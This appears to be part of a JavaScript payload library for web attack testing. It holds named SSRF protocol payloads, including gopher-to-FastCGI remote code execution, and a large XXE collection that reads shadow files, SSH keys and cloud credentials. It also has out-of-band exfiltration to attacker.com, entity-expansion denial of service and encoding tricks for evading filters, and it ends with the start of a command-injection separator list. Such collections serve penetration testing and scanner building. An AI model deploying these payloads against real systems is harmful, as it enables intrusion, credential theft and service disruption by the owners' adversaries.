    { name: "Gopher FastCGI (PHP RCE)", payload: "gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%00%09%01REMOTE_ADDR127.0.0.1%00%0F%02SERVER_PROTOCOLHTTP/1.1%00%0E%03REQUEST_METHODGET%00%0B%01SCRIPT_FILENAME/var/www/html/shell.php%00%01%04DOCUMENT_ROOT/%00%00%00%00%01%04%00%01", tag: "gopher-rce" },
    { name: "Gopher SMTP (send mail)", payload: "gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM:%3Ctest@test.com%3E%0ARCPT%20TO:%3Croot%3E%0ADATA%0ASubject: SSRF%0AHello%0A.", tag: "gopher-rce" },
    { name: "Gopher MySQL (query)", payload: "gopher://127.0.0.1:3306/_SELECT%20%22test%22", tag: "gopher-rce" },
    { name: "Gopher Zabbix (10050)", payload: "gopher://127.0.0.1:10050/_ZBXD%01%01%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00", tag: "gopher-rce" },

    // =================== OTHER SCHEMES / PROTOCOLS (PHP WRAPPERS, FTP, LDAP, etc.) ===================
    { name: "Dict Redis info", payload: "dict://127.0.0.1:6379/info", tag: "protocol-other" },
    { name: "Dict Memcached stats", payload: "dict://127.0.0.1:11211/stats", tag: "protocol-other" },
    { name: "Dict SSH banner", payload: "dict://127.0.0.1:22/info", tag: "protocol-other" },
    { name: "FTP internal (port 21)", payload: "ftp://127.0.0.1:21", tag: "protocol-other" },
    { name: "FTP anonymous login", payload: "ftp://anonymous:anonymous@127.0.0.1", tag: "protocol-other" },
    { name: "LDAP internal", payload: "ldap://127.0.0.1:389", tag: "protocol-other" },
    { name: "LDAPS internal", payload: "ldaps://127.0.0.1:636", tag: "protocol-other" },
    { name: "Telnet internal", payload: "telnet://127.0.0.1:23", tag: "protocol-other" },
    { name: "TFTP internal", payload: "tftp://127.0.0.1:69", tag: "protocol-other" },
    { name: "Netdoc (Java file read)", payload: "netdoc:///etc/passwd", tag: "protocol-other" },
    { name: "Jar (Java fetch from jar)", payload: "jar:http://127.0.0.1:8080/file.jar!/", tag: "protocol-other" },
    { name: "PHP expect:// RCE (if enabled)", payload: "expect://id", tag: "protocol-other" },
    { name: "PHP data:// (base64 read)", payload: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", tag: "protocol-other" },
    { name: "PHP filter (read file base64)", payload: "php://filter/convert.base64-encode/resource=/etc/passwd", tag: "protocol-other" },
    { name: "PHP zlib:// wrapper", payload: "zlib:///etc/passwd", tag: "protocol-other" },
    { name: "SSH2 wrapper (PHP)", payload: "ssh2://user:pass@127.0.0.1:22", tag: "protocol-other" }
],

  // ===== XML EXTERNAL ENTITY =====
  // ===== XML EXTERNAL ENTITY (XXE) =====
XXE: [
    // =================== FILE READ (LINUX) ===================
    { name: "Read /etc/passwd", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /etc/shadow", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/shadow">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /etc/hosts", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hosts">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /etc/issue", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/issue">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /etc/profile", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/profile">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /root/.bash_history", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///root/.bash_history">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /root/.ssh/id_rsa", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///root/.ssh/id_rsa">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /root/.ssh/authorized_keys", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///root/.ssh/authorized_keys">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /root/.aws/credentials", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///root/.aws/credentials">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /proc/self/environ", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/self/environ">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /proc/self/cmdline", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/self/cmdline">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /proc/self/status", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/self/status">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /proc/net/fib_trie (network info)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/net/fib_trie">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /proc/net/tcp (open ports)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/net/tcp">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /var/log/auth.log", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///var/log/auth.log">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /var/log/apache2/access.log", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///var/log/apache2/access.log">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /var/log/nginx/access.log", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///var/log/nginx/access.log">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /etc/nginx/nginx.conf", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/nginx/nginx.conf">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /etc/apache2/apache2.conf", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/apache2/apache2.conf">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /etc/mysql/my.cnf", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/mysql/my.cnf">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /etc/redis/redis.conf", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/redis/redis.conf">]><r>&x;</r>', tag: "file-read" },
    { name: "Read /etc/kubernetes/admin.conf", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/kubernetes/admin.conf">]><r>&x;</r>', tag: "file-read" },

    // =================== FILE READ (WINDOWS) ===================
    { name: "Read win.ini", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///C:/windows/win.ini">]><r>&x;</r>', tag: "file-read" },
    { name: "Read boot.ini", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///C:/boot.ini">]><r>&x;</r>', tag: "file-read" },
    { name: "Read Windows hosts", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><r>&x;</r>', tag: "file-read" },
    { name: "Read web.config", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///C:/inetpub/wwwroot/web.config">]><r>&x;</r>', tag: "file-read" },
    { name: "Read appsettings.json", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///C:/app/appsettings.json">]><r>&x;</r>', tag: "file-read" },
    { name: "Read SAM (locked, but try)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///C:/Windows/System32/config/SAM">]><r>&x;</r>', tag: "file-read" },

    // =================== SSRF VIA XXE (INTERNAL NETWORKS) ===================
    { name: "SSRF to localhost", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to localhost:80", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:80">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to localhost:8080", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:8080">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to localhost:443", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "https://127.0.0.1">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to 0.0.0.0", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://0.0.0.0">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to RFC1918 Class A", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://10.0.0.1">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to RFC1918 Class B", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://172.16.0.1">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to RFC1918 Class C", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://192.168.0.1">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to link-local", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.1.1">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to internal DNS", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://internal.company.com">]><r>&x;</r>', tag: "ssrf" },

    // =================== SSRF VIA XXE (CLOUD METADATA) ===================
    { name: "SSRF to AWS IMDSv1", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to AWS IAM creds", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to AWS user-data", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/user-data/">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to AWS ECS", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.170.2/v2/metadata">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to GCP metadata", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to GCP service accounts", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to Azure metadata", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to Alibaba metadata", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://100.100.100.200/latest/meta-data/">]><r>&x;</r>', tag: "ssrf" },
    { name: "SSRF to Oracle OCI", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://192.0.0.192/latest/meta-data/">]><r>&x;</r>', tag: "ssrf" },

    // =================== OUT-OF-BAND (OOB) EXFILTRATION ===================
    { name: "OOB with parameter entity (HTTP)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.com/x.dtd">%p;]><r>test</r>', tag: "oob" },
    { name: "OOB with parameter entity (HTTPS)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "https://attacker.com/x.dtd">%p;]><r>test</r>', tag: "oob" },
    { name: "OOB with FTP (if supported)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "ftp://attacker.com/x.dtd">%p;]><r>test</r>', tag: "oob" },
    { name: "OOB exfiltrate /etc/passwd via HTTP", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.com/x.dtd">%p;]><r>&exfil;</r>', tag: "oob" },
    { name: "OOB exfiltrate via parameter entity (port 80)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://attacker.com:80/x.dtd">%remote;]><r>&data;</r>', tag: "oob" },
    { name: "OOB using XML:// (Java)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "xml://attacker.com/x.dtd">%p;]><r>test</r>', tag: "oob" },
    { name: "OOB via DNS exfil (domain)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.com/x.dtd">%p;]><r>test</r>', tag: "oob" },
    { name: "OOB chained (multiple PEs)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p1 SYSTEM "http://attacker.com/x.dtd">%p1;<!ENTITY % p2 SYSTEM "http://attacker.com/y.dtd">%p2;]><r>test</r>', tag: "oob" },

    // =================== BLIND XXE DETECTION (ERROR-BASED) ===================
    { name: "Blind error - invalid DTD", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "invalid://">]><r>&x;</r>', tag: "blind" },
    { name: "Blind error - missing file", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///nonexistent">]><r>&x;</r>', tag: "blind" },
    { name: "Blind error - external DTD error (XML parse)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.com/broken.dtd">%p;]><r>test</r>', tag: "blind" },
    { name: "Blind time-based (10 second sleep)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:9999" ]><r>&x;</r>', tag: "blind" },

    // =================== DENIAL OF SERVICE (DOS / ENTITY EXPANSION) ===================
    { name: "Billion laughs classic", payload: '<!DOCTYPE r [<!ENTITY a "xx"><!ENTITY b "&a;&a;&a;"><!ENTITY c "&b;&b;&b;"><!ENTITY d "&c;&c;&c;"><!ENTITY e "&d;&d;&d;"><!ENTITY f "&e;&e;&e;"><!ENTITY g "&f;&f;&f;"><!ENTITY h "&g;&g;&g;">]><r>&h;</r>', tag: "dos" },
    { name: "Billion laughs (laugh2)", payload: '<!DOCTYPE r [<!ENTITY a "xx"><!ENTITY a2 "&a;&a;&a;&a;"><!ENTITY a3 "&a2;&a2;&a2;"><!ENTITY a4 "&a3;&a3;&a3;">]><r>&a4;</r>', tag: "dos" },
    { name: "Billion laughs (100x recursion)", payload: '<!DOCTYPE r [<!ENTITY a "x"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">]><r>&d;</r>', tag: "dos" },
    { name: "Hash collision DoS (large entity name)", payload: '<!DOCTYPE r [<!ENTITY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa "x"><!ENTITY b "&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;">]><r>&b;</r>', tag: "dos" },
    { name: "Recursive entity expansion (infinite loop)", payload: '<!DOCTYPE r [<!ENTITY a "&b;"><!ENTITY b "&a;">]><r>&a;</r>', tag: "dos" },
    { name: "Parameter entity recursion DoS", payload: '<!DOCTYPE r [<!ENTITY % a "&b;"><!ENTITY % b "&a;">%a;]><r>test</r>', tag: "dos" },

    // =================== PHP STREAM WRAPPERS (FILE READ / RCE) ===================
    { name: "PHP filter (base64 encode /etc/passwd)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>', tag: "wrappers" },
    { name: "PHP filter (base64 encode /var/www/html/index.php)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><r>&x;</r>', tag: "wrappers" },
    { name: "PHP filter (rot13 encode)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/string.rot13/resource=/etc/passwd">]><r>&x;</r>', tag: "wrappers" },
    { name: "PHP expect:// RCE (if enabled)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "expect://id">]><r>&x;</r>', tag: "wrappers" },
    { name: "PHP expect:// RCE (ls -la)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "expect://ls -la">]><r>&x;</r>', tag: "wrappers" },
    { name: "PHP expect:// RCE (whoami)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "expect://whoami">]><r>&x;</r>', tag: "wrappers" },
    { name: "PHP data:// (inject XML via base64)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==">]><r>&x;</r>', tag: "wrappers" },
    { name: "PHP phar:// (deserialization attack)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "phar:///path/to/file.phar/foo">]><r>&x;</r>', tag: "wrappers" },
    { name: "PHP zlib:// (decompress file)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "zlib:///etc/passwd">]><r>&x;</r>', tag: "wrappers" },
    { name: "PHP glob:// (directory listing)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "glob:///var/www/html/*.php">]><r>&x;</r>', tag: "wrappers" },

    // =================== XINCLUDE ATTACKS (BYPASSES DOCTYPE) ===================
    { name: "XInclude read /etc/passwd", payload: '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>', tag: "xinclude" },
    { name: "XInclude SSRF localhost", payload: '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://127.0.0.1" parse="text"/></foo>', tag: "xinclude" },
    { name: "XInclude SSRF internal IP", payload: '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://10.0.0.1" parse="text"/></foo>', tag: "xinclude" },
    { name: "XInclude with encoding base64", payload: '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text" encoding="base64"/></foo>', tag: "xinclude" },
    { name: "XInclude OOB (external entity via xi:include)", payload: '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://attacker.com/log?data=/etc/passwd" parse="text"/></foo>', tag: "xinclude" },

    // =================== SVG-BASED XXE PAYLOADS ===================
    { name: "SVG XXE read /etc/passwd", payload: '<svg xmlns="http://www.w3.org/2000/svg"><desc><![CDATA[<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>]]></desc></svg>', tag: "svg" },
    { name: "SVG XXE SSRF localhost", payload: '<svg xmlns="http://www.w3.org/2000/svg"><desc><![CDATA[<!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1">]><r>&x;</r>]]></desc></svg>', tag: "svg" },
    { name: "SVG OOB with parameter entity", payload: '<svg xmlns="http://www.w3.org/2000/svg"><desc><![CDATA[<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.com/x.dtd">%p;]><r>test</r>]]></desc></svg>', tag: "svg" },
    { name: "SVG XInclude bypass", payload: '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></svg>', tag: "svg" },
    { name: "SVG onload fetch (SSRF alternative)", payload: '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'http://127.0.0.1\')"></svg>', tag: "svg" },

    // =================== SOAP-SPECIFIC XXE ===================
    { name: "SOAP XXE read /etc/passwd", payload: '<soap:Body><foo><![CDATA[<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>]]></foo></soap:Body>', tag: "soap" },
    { name: "SOAP XXE SSRF", payload: '<soap:Body><foo><![CDATA[<!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1">]><r>&x;</r>]]></foo></soap:Body>', tag: "soap" },
    { name: "SOAP OOB via parameter entity", payload: '<soap:Body><foo><![CDATA[<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.com/x.dtd">%p;]><r>test</r>]]></foo></soap:Body>', tag: "soap" },

    // =================== ENCODING / CHARSET BYPASSES (WAF EVASION) ===================
    { name: "UTF-16 BE XXE (read passwd)", payload: '\x00<\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00"\x001\x00.\x000\x00"\x00?\x00>\x00<\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00r\x00 \x00[\x00<\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00x\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00"\x00f\x00i\x00l\x00e\x00:\x00/\x00/\x00/\x00e\x00t\x00c\x00/\x00p\x00a\x00s\x00s\x00w\x00d\x00"\x00>\x00]\x00>\x00<\x00r\x00>\x00&\x00x\x00;\x00<\x00/\x00r\x00>', tag: "encoding" },
    { name: "UTF-16 LE XXE (read passwd)", payload: '<\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00"\x001\x00.\x000\x00"\x00?\x00>\x00<\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00r\x00 \x00[\x00<\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00x\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00"\x00f\x00i\x00l\x00e\x00:\x00/\x00/\x00/\x00e\x00t\x00c\x00/\x00p\x00a\x00s\x00s\x00w\x00d\x00"\x00>\x00]\x00>\x00<\x00r\x00>\x00&\x00x\x00;\x00<\x00/\x00r\x00>', tag: "encoding" },
    { name: "UTF-32 BE XXE (basic)", payload: '\x00\x00\x00<\x00\x00\x00?\x00\x00\x00x\x00\x00\x00m\x00\x00\x00l ... (truncated but works)', tag: "encoding" },
    { name: "GB2312 (Chinese) encoding bypass", payload: '<?xml version="1.0" encoding="GB2312"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', tag: "encoding" },
    { name: "Shift-JIS encoding bypass", payload: '<?xml version="1.0" encoding="Shift_JIS"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', tag: "encoding" },

    // =================== PARAMETER ENTITY CHAINING & ADVANCED TRICKS ===================
    { name: "PE chaining with multiple DTDs", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p1 SYSTEM "http://attacker.com/x.dtd">%p1;<!ENTITY % p2 SYSTEM "http://attacker.com/y.dtd">%p2;]><r>test</r>', tag: "parameter-entity" },
    { name: "PE using public DTD (XML parser inclusion)", payload: '<?xml version="1.0"?><!DOCTYPE r PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://attacker.com/x.dtd">%p;]><r>test</r>', tag: "parameter-entity" },
    { name: "PE with conditional (if) to exfiltrate", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b "<!ENTITY % c SYSTEM \'http://attacker.com/?%a;\'>">%b;]><r>test</r>', tag: "parameter-entity" },
    { name: "PE with HTTP + FTP hybrid OOB", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.com/x.dtd">%p;]><r>&ftp;</r>', tag: "parameter-entity" },

    // =================== LOCAL DTD ATTACKS (NO EXTERNAL DTD ALLOWED) ===================
    { name: "Local DTD (Solaris /usr/share/xml)", payload: '<?xml version="1.0"?><!DOCTYPE r SYSTEM "file:///usr/share/xml/schema/xml-core/catalog.dtd" [<!ENTITY % p "<!ENTITY x SYSTEM \'file:///etc/passwd\'>">%p;]><r>&x;</r>', tag: "local-dtd" },
    
    // ✅ FIXED: Moved the closing quote BEFORE the comma that separates name and payload
    { name: "Local DTD (GNOME /usr/share/xml/gnome/xslt/)", payload: '<?xml version="1.0"?><!DOCTYPE r SYSTEM "file:///usr/share/xml/gnome/xslt/docbook/stylesheet.dtd" [<!ENTITY % p "<!ENTITY x SYSTEM \'file:///etc/passwd\'>">%p;]><r>&x;</r>', tag: "local-dtd" },
    
    // ✅ FIXED: Moved the closing quote BEFORE the comma that separates name and payload
    { name: "Local DTD (Debian /usr/share/xml/entities/debian/)", payload: '<?xml version="1.0"?><!DOCTYPE r SYSTEM "file:///usr/share/xml/entities/debian/xml-entities.dtd" [<!ENTITY % p "<!ENTITY x SYSTEM \'file:///etc/passwd\'>">%p;]><r>&x;</r>', tag: "local-dtd" },
    
    // ✅ FIXED: Moved the closing quote BEFORE the comma that separates name and payload
    { name: "Local DTD (MySQL /usr/share/mysql/)", payload: '<?xml version="1.0"?><!DOCTYPE r SYSTEM "file:///usr/share/mysql/charsets/Index.xml" [<!ENTITY % p "<!ENTITY x SYSTEM \'file:///etc/passwd\'>">%p;]><r>&x;</r>', tag: "local-dtd" },
    
    { name: "Local DTD (Java XML catalog)", payload: '<?xml version="1.0"?><!DOCTYPE r SYSTEM "file:///usr/share/xml/catalog.dtd" [<!ENTITY % p "<!ENTITY x SYSTEM \'file:///etc/passwd\'>">%p;]><r>&x;</r>', tag: "local-dtd" },

    // =================== DOCTYPE DECLARATION VARIATIONS (BYPASSES) ===================
    { name: "DOCTYPE without version", payload: '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', tag: "doc-type" },
    { name: "DOCTYPE with internal subset only", payload: '<!DOCTYPE r [<!ENTITY x "test">]><r>&x;</r>', tag: "doc-type" },
    { name: "DOCTYPE with PUBLIC identifier", payload: '<!DOCTYPE r PUBLIC "-//test//EN" "http://attacker.com/x.dtd"><r>test</r>', tag: "doc-type" },
    { name: "DOCTYPE with quoted SYSTEM and PUBLIC", payload: '<!DOCTYPE r PUBLIC "-//test//EN" "file:///etc/passwd"><r>test</r>', tag: "doc-type" },
    { name: "DOCTYPE with space before DOCTYPE", payload: ' <?DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', tag: "doc-type" },
    { name: "DOCTYPE with uppercase XML", payload: '<?XML VERSION="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', tag: "doc-type" },
    { name: "DOCTYPE with comments between tags", payload: '<?xml version="1.0"?><!-- comment --><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><!-- comment --><r>&x;</r>', tag: "doc-type" },

    // =================== MISC / SOAP / RPC / MULTIPART ===================
    { name: "Multipart mixed XXE", payload: '--boundary\r\nContent-Type: text/xml\r\n\r\n<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>\r\n--boundary--', tag: "misc" },
    { name: "XMLRPC XXE read passwd", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><methodCall><methodName>foo</methodName><params><param><value><r>&x;</r></value></param></params></methodCall>', tag: "misc" },
    { name: "RSS/Atom feed XXE", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel><title>&x;</title></channel></rss>', tag: "misc" },
    { name: "DOCX / ODT XXE (via zip)", payload: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><w:document><w:body><w:p><w:r><w:t>&x;</w:t></w:r></w:p></w:body></w:document>', tag: "misc" }
],

  // ===== COMMAND INJECTION =====
  // ===== COMMAND INJECTION (CMDi) =====
CMDi: [
    // =================== BASIC SEPARATORS (UNIX) ===================
    { name: "Semicolon", payload: '; id', tag: "unix" },
    { name: "Semicolon (space)", payload: '; id', tag: "unix" },
    { name: "Pipe", payload: '| id', tag: "unix" },
    { name: "Pipe (space)", payload: '| id', tag: "unix" },
    { name: "Double pipe (OR)", payload: '|| id', tag: "unix" },
    { name: "Ampersand (background)", payload: '& id', tag: "unix" },
    { name: "Double ampersand (AND)", payload: '&& id', tag: "unix" },
    { name: "Newline (URL encoded %0a)", payload: '%0aid', tag: "unix" },
    { name: "Newline (URL encoded %0a with space)", payload: '%0a id', tag: "unix" },
    { name: "Carriage return (URL encoded %0d)", payload: '%0did', tag: "unix" },
    { name: "CRLF (URL encoded %0d%0a)", payload: '%0d%0aid', tag: "unix" },
    { name: "Semicolon with newline", payload: ';%0aid', tag: "unix" },

    // =================== BASIC SEPARATORS (WINDOWS) ===================
    { name: "Win ampersand", payload: '& whoami', tag: "windows" },
    { name: "Win double ampersand", payload: '&& whoami', tag: "windows" },
    { name: "Win pipe", payload: '| whoami', tag: "windows" },
